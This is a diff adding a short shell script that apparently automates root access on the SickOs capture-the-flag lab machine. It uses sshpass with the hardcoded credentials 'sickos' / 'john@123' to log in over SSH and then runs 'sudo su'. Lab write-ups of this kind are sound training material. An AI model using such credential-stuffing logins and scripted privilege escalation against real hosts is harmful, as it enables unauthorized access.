@@ -1,0 +1,7 @@
+#!/bin/sh
+HOSTNAME=$1
+USERNAME=sickos
+PASSWORD=john@123
+
+echo "[\033[0;36m?\e[0;39m] SickOs's password: john@123"
+sshpass -p "$PASSWORD" ssh -t "$USERNAME"@"$HOSTNAME" "sudo su; clear; echo 'Logged in as: '; whoami"
